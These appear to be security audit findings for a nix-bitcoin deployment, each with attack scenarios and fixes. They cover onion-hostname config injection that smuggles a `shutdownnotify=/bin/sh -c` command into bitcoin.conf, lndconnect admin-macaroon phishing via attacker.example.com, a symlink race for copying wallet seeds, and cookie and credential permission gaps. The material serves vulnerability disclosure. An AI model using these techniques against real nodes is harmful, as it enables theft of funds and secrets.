title: Unvalidated tor-writable onion hostname content flows into bitcoin.conf/lnd.conf and the lndconnect admin-macaroon URL
evidence: copyOnionFile() { ...; install -T -m 400 "$src" "$dst"; }  # copies /var/lib/tor/onion/<svc>/hostname verbatim, no content validation. Sinks: modules/onion-services.nix:100 `getPublicAddressCmd = "cat ${config.nix-bitcoin.onionAddresses.dataDir}/services/${service}"`; modules/bitcoind.nix:425 `echo "externalip=$(${cfg.getPublicAddressCmd})"` embedded raw into bitcoin.conf; modules/lnd.nix:228 same for lnd.conf; modules/lndconnect.nix:74 `--host=$(cat ${config.nix-bitcoin.onionAddresses.dataDir}/${onionService})`
attack_scenario: Attacker achieves code execution as the `tor` user (tor is the network-facing daemon processing untrusted traffic; the fork itself treats this boundary as in-scope, cf. prior finding M-4). Precondition on the node: operator enabled `nix-bitcoin.onionServices.bitcoind.public = true` or `.lnd.public = true` (both are documented how-tos in examples/configuration.nix) or `services.lnd.lndconnect.onion = true`. (a) Config injection: attacker writes a multi-line payload to /var/lib/tor/onion/bitcoind/hostname, e.g. line 1 a plausible onion name, line 2 `shutdownnotify=/bin/sh -c '<payload>'` (not present in the generated configFile, so no precedence question; `startupnotify=` also works since bitcoind's GetArg is last-wins). The root onion-addresses service copies it verbatim to /var/lib/onion-addresses/services/bitcoind; at the next bitcoind restart (any deploy/reboot/crash) preStart splices the lines into /var/lib/bitcoind/bitcoin.conf and bitcoind executes the notify command AS THE BITCOIN USER. As `bitcoin`, the attacker reads /etc/nix-bitcoin-secrets/bitcoin-rpcpassword-privileged (0440 bitcoin:bitcoin) and the group-readable cookie, gaining full privileged bitcoind RPC: `sendtoaddress` if the operator keeps any bitcoind wallet (wallet support is on by default; disablewallet is unset), otherwise node-wide eclipse/DoS via unwhitelisted setban/addnode. The same injection into lnd.conf can repoint `bitcoind.rpchost`/`bitcoind.zmqpubrawblock` at an attacker node, eclipsing lnd's chain view (channel-fraud surface). (b) Macaroon phishing: attacker writes `attacker.example.com` to /var/lib/tor/onion/lnd-rest/hostname; it is copied to /var/lib/onion-addresses/lnd/lnd-rest; when the operator runs the documented `lndconnect` pairing command, the printed QR encodes `lndconnect://attacker.example.com:8080?macaroon=<ADMIN MACAROON>` with --nocert (no cert pinning on the onion path). The operator's wallet (Zeus) then presents the admin macaroon to the attacker's host; the attacker replays it against the real lnd-rest onion service and gets full lnd wallet admin. Payoff: goal (1) fund theft, goal (3) secret exfiltration, via a tor->bitcoin/operator privilege-boundary crossing.
impact: funds (admin macaroon theft, privileged RPC to wallet), rce (as bitcoin user), privacy (node eclipse), dos
false_positive_risk: Requires a tor-user compromise first, and the public/lndconnect options enabled. I could not run bitcoind to confirm duplicate-directive precedence for startupnotify, which is why the scenario also uses shutdownnotify (not set by the module, so precedence is irrelevant). The lndconnect macaroon-in-URL flow is fully confirmed by reading the code, but the wallet-side behavior (sending the macaroon to the URL host) is inferred from how lndconnect pairing works, not tested here.
recommendation: Validate hostname content in copyOnionFile before installing: read the file once and require an exact match (e.g. `grep -qxE '[a-z2-7]{56}\.onion'`), failing closed otherwise. Defense in depth at the sinks: wrap the consumer substitution so only a single validated line can be emitted (e.g. `externalip=$(grep -xE ... file)`), and have lndconnect reject host values that are not the expected onion shape.

title: check-then-read TOCTOU in onion-addresses copyOnionFile lets a tor-user swap in a symlink after the -L check, copying arbitrary root-readable files into service-owned outputs
evidence:
if [[ -L $src ]]; then
  echo "Error: refusing to read onion hostname via symlink: $src" >&2
  exit 1
fi
install -T -m 400 "$src" "$dst"
attack_scenario: Attacker-as-tor (same precondition as the previous finding) races the window between the `[[ -L $src ]]` check and `install` opening $src: keep /var/lib/tor/onion/bitcoind/hostname a regular file for the check, then atomically rename a symlink over it pointing at e.g. /var/lib/lnd/lnd-seed-mnemonic or /etc/nix-bitcoin-secrets/lnd-wallet-password. onion-addresses runs as root with CAP_DAC_OVERRIDE, so install follows the symlink and copies the target's contents into /var/lib/onion-addresses/services/bitcoind, chowned to the bitcoin user. The window is microseconds wide, but the attacker can retry on every tor restart (onion-addresses has wantedBy/bindsTo tor.service, so crash-looping tor re-triggers it). Alone this yields nothing the tor user can read (outputs are owned by bitcoin/lnd/operator), but chained with the previous finding's code-exec-as-bitcoin, the attacker reads the copied lnd seed / wallet password from the bitcoin-owned file. Payoff: goal (1) funds via lnd seed theft. The M-4 fix closed the static-symlink case but left the race.
impact: secrets (lnd seed, wallet password) when chained with the config-injection finding; funds downstream
false_positive_risk: The race window is small and I could not test winnability; it also only becomes useful when combined with a way to read a service-owned output (e.g. the previous finding). If systemd serialization or timing makes the swap impractical, this is defense-in-depth only.
recommendation: Open the source with O_NOFOLLOW semantics instead of check-then-read: e.g. `install` is not O_NOFOLLOW-aware, so read the content via a single open (ruby/python or `bash` on a redirected fd after `stat -Lc %F` vs `%F` comparison on the opened fd, or simply `cat` after opening with `set -o noclobber`-style fd passing) and write the validated content to the destination. Validating content per the previous finding also neuters this, since a copied secret would fail the hostname format check before being installed.

title: electrs.toml holding the bitcoind public RPC password is created with the service default umask (0644), relying solely on the 0770 parent dir
attack_scenario: No current attack path: /var/lib/electrs is 0770 electrs:electrs with no other group members, so the 0644 file is unreachable by other users. Unlike lnd.conf (install -m600) and nbxplorer's settings.config (install -m 600), this relies entirely on directory perms; any future change adding a member to the electrs group or relaxing the tmpfiles mode would expose the public RPC credential.
impact: secrets (hardening gap only, no present path)
false_positive_risk: None on the facts; listed as info because the 0770 directory currently provides the boundary.
recommendation: Write it with `install -m 600` like the sibling modules, so the file is safe regardless of directory-mode changes.

title: postStart `chmod g=r` on .cookie does not clear other-readable bit; world-readability depends entirely on bitcoind (UMask unset by default)
evidence:
postStart = ''
  # NOTE: this makes the RPC cookie readable by group `bitcoin` ...
  chmod g=r '${cfg.dataDir}/${optionalString cfg.regtest "regtest/"}.cookie'
'' ...
... UMask = mkIf cfg.dataDirReadableByGroup "0027";  (line 453: UMask is ONLY set when dataDirReadableByGroup is true)
attack_scenario: The .cookie file is a bearer token for FULL privileged bitcoind RPC (no rpcwhitelist: sendtoaddress, wallet RPCs, stop, importprivkey). postStart only runs `chmod g=r`, which sets group=r but leaves the owner and OTHER permission bits untouched; it never masks other-read. The service UMask is left at systemd's default 0022 (the `UMask=0027` at line 453 is gated behind `dataDirReadableByGroup`, which is false by default). So the cookie's other-readable bit is whatever bitcoind (or an alternative `services.bitcoind.package` such as bitcoind-knots, or a future version) created it with. IF that implementation creates .cookie relying on the process umask instead of explicitly chmod-ing 0600, the cookie ends up world-readable (0644 & umask 0022), `chmod g=r` does not fix it, and ANY local user (a compromised lnd/electrs/btcpayserver/nbxplorer service user, none of which are in the `bitcoin` group) can `cat /var/lib/bitcoind/.cookie` and gain full privileged RPC. From there: drain the bitcoind wallet via sendtoaddress (wallet is enabled by default), stop the node, or interrogate wallet UTXOs. Starting access: a service-account compromise (e.g. a btcpayserver web RCE). Payoff: on-chain fund theft / DoS (attacker goal 1, 5).
impact: funds (conditional: requires bitcoind to create .cookie without explicit 0600); dos
false_positive_risk: High. Bitcoin Core almost certainly creates .cookie with explicit owner-read|owner-write (0600) via fs::permissions, in which case `chmod g=r` yields 0640 (rw-r-----) and there is NO exposure. I could not verify bitcoind's cookie-creation mode from in-repo code (upstream app source is out of scope), and the upstream nix-bitcoin project has shipped this exact `chmod g=r` pattern for years without a reported world-readable-cookie vulnerability, which strongly suggests the cookie is 0600 in practice. To confirm/refute in one command on a running node: `ls -l /var/lib/bitcoind/.cookie` (expect rw-r----- = 0640; if rw-r--r-- = 0644, this finding is real and critical).
recommendation: Stop relying on bitcoind's own file mode for the cookie's other-readability. Either set `UMask = "0077"` on the bitcoind service unconditionally (so no file bitcoind creates is ever other-readable, and postStart `chmod g=r` then yields a guaranteed 0640), or change postStart to an explicit `chmod 0640 '${...}.cookie'` that clears the other bits. The latter is a one-word change and removes the hinge entirely.
